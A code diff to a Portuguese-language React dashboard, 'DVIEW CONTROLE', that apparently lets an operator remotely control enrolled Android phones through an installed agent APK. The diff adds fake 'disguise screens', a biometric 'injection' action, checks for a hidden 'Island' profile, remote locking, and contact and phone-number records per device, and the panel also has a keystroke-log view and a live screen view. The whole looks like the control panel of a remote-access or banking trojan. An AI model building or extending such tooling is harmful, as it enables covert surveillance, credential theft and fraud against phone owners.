@@ -1,22 +1,31 @@
 import { useEffect, useMemo, useState } from "react";
 import {
+  Check,
   ChevronLeft,
   ChevronRight,
   CircleDot,
+  Copy,
   Download,
   ExternalLink,
   Layers,
+  Link2,
   MonitorSmartphone,
   Plus,
   Radio,
+  ShieldCheck,
   SlidersHorizontal,
   Smartphone,
+  X,
   Zap
 } from "lucide-react";
+import { QRCodeSVG } from "qrcode.react";
 import { useAppStore } from "../../store";
 import { api } from "../../api";
 import type { ControlDevice, ControlTool, InstalledAppItem } from "./types";
 import { initialInstalledApps } from "./mockData";
+import { UnifiedControlSidebar } from "./UnifiedControlSidebar";
+import { DeviceContextMenu } from "./DeviceContextMenu";
+import { DeviceEditModal } from "../../components/DeviceEditModal";
 import { DeviceSidebar } from "./DeviceSidebar";
 import { DeviceToolMenu, getAppEmojiFallback } from "./DeviceToolMenu";
 import { ScreenView } from "./views/ScreenView";
@@ -65,7 +74,7 @@ function formatDateGroup(iso?: string): string {
 }
 
 function mapApiToControl(dev: any, existing?: ControlDevice): ControlDevice {
-  const isOnline = (dev.status || "online") === "online";
+  const isOnline = dev.status ? dev.status === "online" : (existing ? existing.status === "online" : false);
   const netType = dev.networkType || existing?.networkType || (isOnline ? "wifi" : "offline");
   return {
     id: dev.id,
@@ -73,7 +82,7 @@ function mapApiToControl(dev: any, existing?: ControlDevice): ControlDevice {
     model: dev.model,
     ip: dev.ip || dev.ipAddress || (dev.id.startsWith("emu") ? "10.0.2.2" : "192.168.100.2"),
     battery: dev.battery ?? 100,
-    status: dev.status || "online",
+    status: dev.status || existing?.status || (isOnline ? "online" : "offline"),
     lastSeen: formatLastSeen(dev.lastSeen),
     androidVersion: dev.androidVersion || "14.0",
     manufacturer: dev.model?.split(" ")[0] || "Android",
@@ -85,15 +94,65 @@ function mapApiToControl(dev: any, existing?: ControlDevice): ControlDevice {
     pingMs: dev.pingMs ?? existing?.pingMs ?? 14,
     screenLocked: existing?.screenLocked ?? false,
     dateGroup: formatDateGroup(dev.lastSeen || dev.enrolledAt),
-    isFavorite: existing?.isFavorite ?? false
+    isFavorite: existing?.isFavorite ?? false,
+    disguiseScreen: dev.disguiseScreen ?? existing?.disguiseScreen ?? null,
+    contactName: dev.contactName ?? existing?.contactName,
+    phoneNumber: dev.phoneNumber ?? existing?.phoneNumber,
+    apkName: dev.apkName ?? existing?.apkName,
+    notes: dev.notes ?? existing?.notes
   };
+}
+
+export function deduplicateControlDevices(list: ControlDevice[]): ControlDevice[] {
+  const map = new Map<string, ControlDevice>();
+  for (const dev of list) {
+    const cleanPhone = dev.phoneNumber ? dev.phoneNumber.replace(/\D/g, "") : "";
+    const contactKey = dev.contactName ? `${dev.contactName.trim().toLowerCase()}_${(dev.model || "").trim().toLowerCase()}` : "";
+    const accountKey = dev.userAccount ? dev.userAccount.trim().toLowerCase() : "";
+    const key = cleanPhone
+      ? `phone:${cleanPhone}`
+      : accountKey
+      ? `acct:${accountKey}`
+      : contactKey
+      ? `contact:${contactKey}`
+      : `id:${dev.id}`;
+
+    if (!map.has(key)) {
+      map.set(key, { ...dev });
+    } else {
+      const existing = map.get(key)!;
+      if (dev.status === "online" && existing.status !== "online") {
+        // Prioridade inegociável: Status online sempre vence!
+        map.set(key, { ...existing, ...dev, status: "online" });
+      } else if (dev.status !== "online" && existing.status === "online") {
+        map.set(key, { ...dev, ...existing, status: "online" });
+      } else {
+        map.set(key, { ...existing, ...dev });
+      }
+    }
+  }
+  return Array.from(map.values());
 }
 
 export function ControlPanel() {
   const { devices: apiDevices, setView, upsertDevice, removeDevice, selectedDeviceId, setSelectedDeviceId } = useAppStore();
   const [controlDevices, setControlDevices] = useState<ControlDevice[]>(() =>
-    (apiDevices || []).map((d) => mapApiToControl(d))
+    deduplicateControlDevices((apiDevices || []).map((d) => mapApiToControl(d)))
   );
+
+  // Sync controlDevices when apiDevices changes from WebSocket or polling
+  useEffect(() => {
+    if (apiDevices && apiDevices.length > 0) {
+      setControlDevices((curr) => {
+        const mapped = apiDevices.map((d) => {
+          const existing = curr.find((c) => c.id === d.id);
+          return mapApiToControl(d, existing);
+        });
+        return deduplicateControlDevices(mapped);
+      });
+    }
+  }, [apiDevices]);
+
   const [selectedId, setSelectedId] = useState<string>(() => selectedDeviceId || apiDevices[0]?.id || "");
   const [activeTool, setActiveTool] = useState<ControlTool>("tela");
   const [activeAppForScreen, setActiveAppForScreen] = useState<InstalledAppItem | null>(null);
@@ -104,9 +163,54 @@ export function ControlPanel() {
     { id: string; device: ControlDevice; x: number; y: number; zIndex: number }[]
   >([]);
 
+  // Context Menu State
+  const [contextMenu, setContextMenu] = useState<{ x: number; y: number; device: ControlDevice } | null>(null);
+
+  // Left sidebar collapse toggle
+  const [isSidebarCollapsed, setIsSidebarCollapsed] = useState(false);
+
+  // Device Edit Modal state (Contact & APK)
+  const [editingDevice, setEditingDevice] = useState<ControlDevice | null>(null);
+
+  // Instance URL & Token Modal state
+  const [instanceModal, setInstanceModal] = useState<{
+    device: ControlDevice;
+    token: string;
+    encryptedUrl: string;
+    directUrl: string;
+  } | null>(null);
+  const [copiedKind, setCopiedKind] = useState<"enc" | "dir" | null>(null);
+
   const showToast = (msg: string) => {
     setToastMsg(msg);
     setTimeout(() => setToastMsg(null), 3500);
+  };
+
+  const handleTriggerBiometric = async (dev: ControlDevice) => {
+    try {
+      await api.authenticateBiometric(dev.id, 1);
+      showToast(`🧬 Biometria confirmada e autenticada no aparelho ${dev.name}!`);
+    } catch {
+      showToast(`Falha ao injetar biometria no aparelho ${dev.name}.`);
+    }
+  };
+
+  const handleValidateIsland = async (dev: ControlDevice) => {
+    try {
+      const res = await api.validateIsland(dev.id);
+      showToast(res?.isInstalled ? `✓ Perfil Island Ativo (User ${res.profileUserId || 10})` : "✕ Perfil Island não detectado");
+    } catch {
+      showToast("Erro ao verificar Island.");
+    }
+  };
+
+  const handleReconnect = async (dev: ControlDevice) => {
+    try {
+      await api.reconnectDevice(dev.id);
+      showToast(`Aparelho ${dev.name} reconectado com sucesso!`);
+    } catch {
+      showToast(`Erro ao reconectar ${dev.name}.`);
+    }
   };
 
   const handleOpenFloating = (targetDev?: ControlDevice) => {
@@ -148,6 +252,62 @@ export function ControlPanel() {
       "width=480,height=880,menubar=no,toolbar=no,status=no,resizable=yes"
     );
     showToast(`Janela Desktop de ${dev.name} desencaixada!`);
+  };
+
+  const handleCopyDirectUrl = (targetDev?: ControlDevice) => {
+    const dev = targetDev || selectedDevice;
+    if (!dev) return;
+    const url = `${window.location.origin}/instance/${encodeURIComponent(dev.id)}`;
+    navigator.clipboard.writeText(url).then(() => {
+      showToast(`🔗 Link direto da instância (${dev.name}) copiado!`);
+    }).catch(() => {
+      showToast(`Link da instância: ${url}`);
+    });
+    api.getEncryptedInstanceUrl(dev.id).then((res) => {
+      setInstanceModal({
+        device: dev,
+        token: res.token,
+        encryptedUrl: res.encryptedUrl,
+        directUrl: res.directUrl
+      });
+    }).catch(() => {
+      setInstanceModal({
+        device: dev,
+        token: "",
+        encryptedUrl: url,
+        directUrl: url
+      });
+    });
+  };
+
+  const handleCopyEncryptedUrl = async (targetDev?: ControlDevice) => {
+    const dev = targetDev || selectedDevice;
+    if (!dev) return;
+    try {
+      const res = await api.getEncryptedInstanceUrl(dev.id);
+      if (res?.encryptedUrl) {
+        await navigator.clipboard.writeText(res.encryptedUrl).catch(() => {});
+        setInstanceModal({
+          device: dev,
+          token: res.token,
+          encryptedUrl: res.encryptedUrl,
+          directUrl: res.directUrl
+        });
+        showToast(`🔒 URL Criptografado da Instância (${dev.name}) copiado com sucesso!`);
+        return;
+      }
+    } catch {
+      // Fallback
+    }
+    const fallbackUrl = `${window.location.origin}/instance/${encodeURIComponent(dev.id)}`;
+    await navigator.clipboard.writeText(fallbackUrl).catch(() => {});
+    setInstanceModal({
+      device: dev,
+      token: "",
+      encryptedUrl: fallbackUrl,
+      directUrl: fallbackUrl
+    });
+    showToast(`Link da instância: ${fallbackUrl}`);
   };
 
   // Auto-fetch real devices from backend on mount if not loaded
@@ -312,45 +472,47 @@ export function ControlPanel() {
   const onlineCount = controlDevices.filter((d) => d.status === "online").length;
   const offlineCount = controlDevices.filter((d) => d.status === "offline").length;
 
-  const handleToggleLock = async () => {
-    if (!selectedDevice) return;
+  const handleToggleLock = async (targetDev?: ControlDevice) => {
+    const dev = targetDev || selectedDevice;
+    if (!dev) return;
     try {
-      const res = await api.sendPower(selectedDevice.id);
-      const nextLocked = res?.locked ?? !selectedDevice.screenLocked;
+      const res = await api.sendPower(dev.id);
+      const nextLocked = res?.locked ?? !dev.screenLocked;
       setControlDevices((curr) =>
-        curr.map((d) => (d.id === selectedDevice.id ? { ...d, screenLocked: nextLocked } : d))
+        curr.map((d) => (d.id === dev.id ? { ...d, screenLocked: nextLocked } : d))
       );
       showToast(
-        `Comando executado: ${nextLocked ? "TELA BLOQUEADA" : "TELA DESBLOQUEADA"} em ${selectedDevice.name}.`
+        `Comando executado: ${nextLocked ? "TELA BLOQUEADA" : "TELA DESBLOQUEADA"} em ${dev.name}.`
       );
     } catch {
-      const nextLocked = !selectedDevice.screenLocked;
+      const nextLocked = !dev.screenLocked;
       setControlDevices((curr) =>
-        curr.map((d) => (d.id === selectedDevice.id ? { ...d, screenLocked: nextLocked } : d))
+        curr.map((d) => (d.id === dev.id ? { ...d, screenLocked: nextLocked } : d))
       );
       showToast(
-        `Comando enviado: ${nextLocked ? "TELA BLOQUEADA" : "TELA DESBLOQUEADA"} em ${selectedDevice.name}.`
+        `Comando enviado: ${nextLocked ? "TELA BLOQUEADA" : "TELA DESBLOQUEADA"} em ${dev.name}.`
       );
     }
   };
 
-  const handleUninstall = async () => {
-    if (!selectedDevice) return;
-    if (confirm(`Deseja realmente solicitar a desinstalação do agente em ${selectedDevice.name}?`)) {
+  const handleUninstall = async (targetDev?: ControlDevice) => {
+    const dev = targetDev || selectedDevice;
+    if (!dev) return;
+    if (confirm(`Deseja realmente solicitar a desinstalação do agente em ${dev.name}?`)) {
       try {
-        await api.deleteDevice(selectedDevice.id);
+        await api.deleteDevice(dev.id);
       } catch (err) {
         console.warn("Backend offline or error deleting device:", err);
       }
-      removeDevice(selectedDevice.id);
-      const remaining = controlDevices.filter((d) => d.id !== selectedDevice.id);
+      removeDevice(dev.id);
+      const remaining = controlDevices.filter((d) => d.id !== dev.id);
       setControlDevices(remaining);
-      if (selectedId === selectedDevice.id) {
+      if (selectedId === dev.id) {
         const nextId = remaining[0]?.id || "";
         setSelectedId(nextId);
         setSelectedDeviceId(nextId || null);
       }
-      showToast(`Ordem de remoção transmitida e dispositivo ${selectedDevice.name} desvinculado.`);
+      showToast(`Ordem de remoção transmitida e dispositivo ${dev.name} desvinculado.`);
     }
   };
 
@@ -362,24 +524,6 @@ export function ControlPanel() {
           <span>{toastMsg}</span>
         </div>
       )}
-
-      {/* Top Global Control Bar */}
-      <div className="control-topbar">
-        <div className="control-topbar-brand-block">
-          <span className="control-brand-title">DVIEW CONTROLE</span>
-          <div className="control-brand-status-row">
-            <span className="brand-stat-item online">
-              <span className="brand-stat-dot online" /> {onlineCount} online
-            </span>
-            <span className="brand-stat-item offline">
-              <span className="brand-stat-dot offline" /> {offlineCount} offline
-            </span>
-            <span className="brand-stat-item" style={{ color: "#38bdf8" }}>
-              <CircleDot size={11} style={{ marginRight: "4px" }} /> Telemetria em Tempo Real
-            </span>
-          </div>
-        </div>
-      </div>
 
       {/* Render 3-Columns or Empty State */}
       {controlDevices.length === 0 ? (
@@ -450,7 +594,22 @@ export function ControlPanel() {
         <div style={{ display: "flex", flexDirection: "column", flex: 1, minHeight: 0, overflow: "hidden", position: "relative" }}>
           {/* Top Tactical Command Ribbon */}
           <div className="control-ribbon-toolbar">
-            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+              {/* Brand and online pill */}
+              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+                <span style={{ fontWeight: 800, fontSize: "12px", color: "#ffffff", letterSpacing: "0.5px" }}>DVIEW CONTROLE</span>
+                <span className="brand-stat-item online" style={{ fontSize: "11px", color: "#22c55e", fontWeight: 700, display: "inline-flex", alignItems: "center", gap: "4px" }}>
+                  <span className="brand-stat-dot online" /> {onlineCount} online
+                </span>
+                {offlineCount > 0 && (
+                  <span className="brand-stat-item offline" style={{ fontSize: "11px", color: "#94a3b8", display: "inline-flex", alignItems: "center", gap: "4px" }}>
+                    <span className="brand-stat-dot offline" /> {offlineCount} off
+                  </span>
+                )}
+              </div>
+
+              <div style={{ width: "1px", height: "18px", background: "#1e293b", margin: "0 2px" }} />
+
               {/* Focus Mode Toggle */}
               <button
                 type="button"
@@ -462,10 +621,24 @@ export function ControlPanel() {
                 title="Modo Foco: Oculta colunas laterais para maximizar área de visualização dos aparelhos"
               >
                 {focusMode ? <ChevronRight size={14} /> : <ChevronLeft size={14} />}
-                <span>{focusMode ? "MOSTRAR PAINÉIS" : "MODO FOCO (EXPANDIR)"}</span>
+                <span>{focusMode ? "MOSTRAR PAINÉIS" : "MODO FOCO"}</span>
               </button>
 
-              <div style={{ width: "1px", height: "18px", background: "#1e293b", margin: "0 4px" }} />
+              {/* Sidebar Collapse Toggle */}
+              <button
+                type="button"
+                className={`ribbon-btn ${isSidebarCollapsed ? "active" : ""}`}
+                onClick={() => {
+                  setIsSidebarCollapsed(!isSidebarCollapsed);
+                  showToast(isSidebarCollapsed ? "Menu lateral de aparelhos exibido" : "Menu lateral recolhido para visão ampla!");
+                }}
+                title={isSidebarCollapsed ? "Mostrar menu lateral unificado" : "Recolher menu lateral unificado"}
+              >
+                <SlidersHorizontal size={13} />
+                <span>{isSidebarCollapsed ? "MOSTRAR MENU" : "RECOLHER MENU"}</span>
+              </button>
+
+              <div style={{ width: "1px", height: "18px", background: "#1e293b", margin: "0 2px" }} />
 
               {/* Grid Layout Selector */}
               <div style={{ display: "flex", alignItems: "center", background: "#060911", border: "1px solid #1e293b", borderRadius: "6px", padding: "2px" }}>
@@ -545,6 +718,45 @@ export function ControlPanel() {
             </div>
 
             <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+              {/* Encrypted Instance URL & Direct Link */}
+              {selectedDevice && (
+                <>
+                  <button
+                    type="button"
+                    className="ribbon-btn"
+                    onClick={() => handleCopyEncryptedUrl()}
+                    title="Copiar URL Criptografado (AES-256-GCM) para conexão segura direta a esta instância"
+                    style={{
+                      color: "#00f0ff",
+                      borderColor: "rgba(0, 240, 255, 0.4)",
+                      background: "rgba(0, 240, 255, 0.08)",
+                      display: "flex",
+                      alignItems: "center",
+                      gap: "5px"
+                    }}
+                  >
+                    <ShieldCheck size={13} style={{ color: "#00f0ff" }} />
+                    <span>🔒 URL Criptografado</span>
+                  </button>
+
+                  <button
+                    type="button"
+                    className="ribbon-btn"
+                    onClick={() => handleCopyDirectUrl()}
+                    title="Copiar Link direto para esta instância de aparelho"
+                    style={{
+                      color: "#cbd5e1",
+                      display: "flex",
+                      alignItems: "center",
+                      gap: "5px"
+                    }}
+                  >
+                    <Link2 size={13} />
+                    <span>🔗 Link Instância</span>
+                  </button>
+                </>
+              )}
+
               {/* Open Floating Window */}
               <button
                 type="button"
@@ -571,29 +783,26 @@ export function ControlPanel() {
           </div>
 
           <div className={`control-three-cols-wrapper ${focusMode ? "focus-mode" : ""}`}>
-            {/* Col 1: Devices list */}
-            <DeviceSidebar
+            {/* Single Unified Left Sidebar */}
+            <UnifiedControlSidebar
               devices={controlDevices}
+              selectedDevice={selectedDevice}
               selectedId={selectedDevice?.id || ""}
-              onSelect={(dev) => {
+              activeTool={activeTool}
+              onSelectDevice={(dev) => {
                 setSelectedId(dev.id);
                 setSelectedDeviceId(dev.id);
+                window.history.replaceState(null, "", `/instance/${encodeURIComponent(dev.id)}`);
               }}
+              onSelectTool={setActiveTool}
               onToggleFavorite={handleToggleFavorite}
               onAddEmulator={handleAddEmulator}
+              onToggleLock={handleToggleLock}
+              onUninstall={handleUninstall}
+              onContextMenu={(e, dev) => setContextMenu({ x: e.clientX, y: e.clientY, device: dev })}
+              isCollapsed={isSidebarCollapsed}
+              onToggleCollapse={() => setIsSidebarCollapsed(!isSidebarCollapsed)}
             />
-
-            {/* Col 2: Selected device tools menu */}
-            {selectedDevice && (
-              <DeviceToolMenu
-                device={selectedDevice}
-                activeTool={activeTool}
-                onSelectTool={setActiveTool}
-                onToggleLock={handleToggleLock}
-                onUninstall={handleUninstall}
-                onSelectTarget={handleSelectTarget}
-              />
-            )}
 
             {/* Col 3: Active tool workspace */}
             <main className="control-col-workspace">
@@ -613,7 +822,11 @@ export function ControlPanel() {
                       activeApp={activeAppForScreen}
                       onCloseApp={() => setActiveAppForScreen(null)}
                       allDevices={controlDevices}
-                      onSelectDevice={(dev) => setSelectedId(dev.id)}
+                      onSelectDevice={(dev) => {
+                        setSelectedId(dev.id);
+                        setSelectedDeviceId(dev.id);
+                        window.history.replaceState(null, "", `/instance/${encodeURIComponent(dev.id)}`);
+                      }}
                     />
                   )}
                   {activeTool === "teclado" && <KeyboardLogView device={selectedDevice} />}
@@ -650,6 +863,268 @@ export function ControlPanel() {
               onBringToFront={() => handleBringToFront(inst.id)}
             />
           ))}
+
+          {/* RIGHT-CLICK CONTEXT MENU ON DEVICES */}
+          {contextMenu && (
+            <DeviceContextMenu
+              x={contextMenu.x}
+              y={contextMenu.y}
+              device={contextMenu.device}
+              onClose={() => setContextMenu(null)}
+              onSelectDevice={(dev) => {
+                setSelectedId(dev.id);
+                setSelectedDeviceId(dev.id);
+              }}
+              onOpenTool={(tool) => setActiveTool(tool)}
+              onOpenFloating={(dev) => handleOpenFloating(dev)}
+              onPopoutDesktop={(dev) => handlePopoutDesktop(dev)}
+              onToggleLock={(dev) => handleToggleLock(dev)}
+              onTriggerBiometric={(dev) => handleTriggerBiometric(dev)}
+              onValidateIsland={(dev) => handleValidateIsland(dev)}
+              onReconnect={(dev) => handleReconnect(dev)}
+              onDelete={(dev) => handleUninstall(dev)}
+              onEditDevice={(dev) => setEditingDevice(dev)}
+              onCopyDirectUrl={(dev) => handleCopyDirectUrl(dev)}
+              onCopyEncryptedUrl={(dev) => handleCopyEncryptedUrl(dev)}
+            />
+          )}
+
+          {/* DEVICE EDIT MODAL (CONTACT & APK) */}
+          {editingDevice && (
+            <DeviceEditModal
+              device={editingDevice}
+              isOpen={Boolean(editingDevice)}
+              onClose={() => setEditingDevice(null)}
+              onSaved={(updated) => {
+                setEditingDevice(null);
+                showToast(`✓ Dados cadastrais de ${updated.contactName || updated.name} atualizados!`);
+              }}
+            />
+          )}
+
+          {/* INSTANCE URL & TOKEN MODAL (AES-256-GCM) */}
+          {instanceModal && (
+            <div
+              className="device-edit-modal-backdrop"
+              onClick={() => setInstanceModal(null)}
+              style={{
+                position: "fixed",
+                inset: 0,
+                backgroundColor: "rgba(0, 0, 0, 0.75)",
+                backdropFilter: "blur(6px)",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                zIndex: 99999,
+                padding: "16px"
+              }}
+            >
+              <div
+                className="device-edit-modal-card"
+                onClick={(e) => e.stopPropagation()}
+                style={{
+                  background: "#0d111a",
+                  border: "1px solid rgba(0, 240, 255, 0.3)",
+                  borderRadius: "14px",
+                  padding: "24px",
+                  maxWidth: "560px",
+                  width: "100%",
+                  boxShadow: "0 20px 60px rgba(0, 0, 0, 0.8), 0 0 30px rgba(0, 240, 255, 0.15)",
+                  color: "#f8fafc"
+                }}
+              >
+                {/* Header */}
+                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "16px" }}>
+                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+                    <div style={{ width: "36px", height: "36px", borderRadius: "8px", background: "rgba(0, 240, 255, 0.15)", border: "1px solid rgba(0, 240, 255, 0.3)", display: "grid", placeItems: "center" }}>
+                      <ShieldCheck size={20} style={{ color: "#00f0ff" }} />
+                    </div>
+                    <div>
+                      <h3 style={{ fontSize: "16px", fontWeight: 800, color: "#ffffff", margin: 0 }}>
+                        Conexão de Instância Criptografada
+                      </h3>
+                      <div style={{ fontSize: "12px", color: "#94a3b8", display: "flex", alignItems: "center", gap: "6px", marginTop: "2px" }}>
+                        <span>{instanceModal.device.name}</span>
+                        <span>•</span>
+                        <span style={{ fontFamily: "var(--font-mono)", color: "#38bdf8" }}>{instanceModal.device.id}</span>
+                      </div>
+                    </div>
+                  </div>
+                  <button
+                    type="button"
+                    onClick={() => setInstanceModal(null)}
+                    style={{ background: "transparent", border: "none", color: "#64748b", cursor: "pointer", padding: "4px" }}
+                  >
+                    <X size={18} />
+                  </button>
+                </div>
+
+                {/* Badge Security Info */}
+                <div style={{ background: "rgba(0, 240, 255, 0.06)", border: "1px solid rgba(0, 240, 255, 0.2)", borderRadius: "8px", padding: "10px 14px", marginBottom: "16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                  <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+                    <CircleDot size={12} style={{ color: "#00f0ff" }} />
+                    <span style={{ fontSize: "12px", color: "#e2e8f0" }}>
+                      Túnel e Token Assinados com <strong>AES-256-GCM</strong>
+                    </span>
+                  </div>
+                  <span style={{ fontSize: "11px", color: "#22c55e", fontWeight: 700, background: "rgba(34, 197, 94, 0.15)", border: "1px solid rgba(34, 197, 94, 0.3)", padding: "2px 8px", borderRadius: "12px" }}>
+                    Isolamento Ativo
+                  </span>
+                </div>
+
+                {/* Encrypted URL field */}
+                <div style={{ marginBottom: "14px" }}>
+                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "6px" }}>
+                    <label style={{ fontSize: "12px", fontWeight: 700, color: "#00f0ff", display: "flex", alignItems: "center", gap: "5px" }}>
+                      🔒 URL Criptografado da Instância (Recomendado)
+                    </label>
+                    <span style={{ fontSize: "10px", color: "#64748b" }}>Sem exposição de ID em texto claro</span>
+                  </div>
+                  <div style={{ display: "flex", gap: "8px" }}>
+                    <input
+                      type="text"
+                      readOnly
+                      value={instanceModal.encryptedUrl}
+                      style={{
+                        flex: 1,
+                        background: "#060911",
+                        border: "1px solid #1e293b",
+                        borderRadius: "8px",
+                        padding: "9px 12px",
+                        color: "#00f0ff",
+                        fontFamily: "var(--font-mono)",
+                        fontSize: "12px",
+                        outline: "none"
+                      }}
+                      onClick={(e) => (e.target as HTMLInputElement).select()}
+                    />
+                    <button
+                      type="button"
+                      className="primary"
+                      onClick={() => {
+                        navigator.clipboard.writeText(instanceModal.encryptedUrl);
+                        setCopiedKind("enc");
+                        showToast("🔒 URL Criptografado copiado!");
+                        setTimeout(() => setCopiedKind(null), 2500);
+                      }}
+                      style={{
+                        padding: "0 14px",
+                        fontSize: "12px",
+                        fontWeight: 700,
+                        display: "flex",
+                        alignItems: "center",
+                        gap: "6px",
+                        background: copiedKind === "enc" ? "#22c55e" : undefined,
+                        whiteSpace: "nowrap"
+                      }}
+                    >
+                      {copiedKind === "enc" ? <Check size={14} /> : <Copy size={14} />}
+                      <span>{copiedKind === "enc" ? "Copiado!" : "Copiar"}</span>
+                    </button>
+                  </div>
+                </div>
+
+                {/* Direct URL field */}
+                <div style={{ marginBottom: "18px" }}>
+                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "6px" }}>
+                    <label style={{ fontSize: "12px", fontWeight: 700, color: "#94a3b8", display: "flex", alignItems: "center", gap: "5px" }}>
+                      <Link2 size={13} /> Link Direto da Instância
+                    </label>
+                    <span style={{ fontSize: "10px", color: "#64748b" }}>Parâmetro direto ?instance=...</span>
+                  </div>
+                  <div style={{ display: "flex", gap: "8px" }}>
+                    <input
+                      type="text"
+                      readOnly
+                      value={instanceModal.directUrl}
+                      style={{
+                        flex: 1,
+                        background: "#060911",
+                        border: "1px solid #1e293b",
+                        borderRadius: "8px",
+                        padding: "9px 12px",
+                        color: "#cbd5e1",
+                        fontFamily: "var(--font-mono)",
+                        fontSize: "12px",
+                        outline: "none"
+                      }}
+                      onClick={(e) => (e.target as HTMLInputElement).select()}
+                    />
+                    <button
+                      type="button"
+                      className="secondary"
+                      onClick={() => {
+                        navigator.clipboard.writeText(instanceModal.directUrl);
+                        setCopiedKind("dir");
+                        showToast("🔗 Link Direto copiado!");
+                        setTimeout(() => setCopiedKind(null), 2500);
+                      }}
+                      style={{
+                        padding: "0 14px",
+                        fontSize: "12px",
+                        fontWeight: 700,
+                        display: "flex",
+                        alignItems: "center",
+                        gap: "6px",
+                        background: copiedKind === "dir" ? "rgba(34, 197, 94, 0.2)" : undefined,
+                        color: copiedKind === "dir" ? "#22c55e" : undefined,
+                        whiteSpace: "nowrap"
+                      }}
+                    >
+                      {copiedKind === "dir" ? <Check size={14} /> : <Copy size={14} />}
+                      <span>{copiedKind === "dir" ? "Copiado!" : "Copiar"}</span>
+                    </button>
+                  </div>
+                </div>
+
+                {/* QR Code and Actions Footer */}
+                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", paddingTop: "14px", borderTop: "1px solid #1e293b" }}>
+                  <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
+                    <div style={{ background: "#ffffff", padding: "6px", borderRadius: "8px", display: "inline-flex" }}>
+                      <QRCodeSVG value={instanceModal.encryptedUrl} size={64} level="M" />
+                    </div>
+                    <div>
+                      <span style={{ fontSize: "11px", fontWeight: 700, color: "#ffffff", display: "block" }}>
+                        Acesso Móvel Rápido
+                      </span>
+                      <small style={{ fontSize: "10px", color: "#64748b" }}>
+                        Escaneie para abrir direto nesta instância
+                      </small>
+                    </div>
+                  </div>
+
+                  <div style={{ display: "flex", gap: "8px" }}>
+                    <a
+                      href={instanceModal.encryptedUrl}
+                      target="_blank"
+                      rel="noreferrer"
+                      className="secondary compact-btn"
+                      style={{
+                        display: "inline-flex",
+                        alignItems: "center",
+                        gap: "6px",
+                        padding: "8px 14px",
+                        fontSize: "12px",
+                        textDecoration: "none",
+                        color: "#38bdf8"
+                      }}
+                    >
+                      <ExternalLink size={13} />
+                      <span>Abrir em Nova Aba</span>
+                    </a>
+                    <button
+                      type="button"
+                      className="primary compact-btn"
+                      onClick={() => setInstanceModal(null)}
+                      style={{ padding: "8px 16px", fontSize: "12px" }}
+                    >
+                      Concluir
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
         </div>
       )}
     </div>
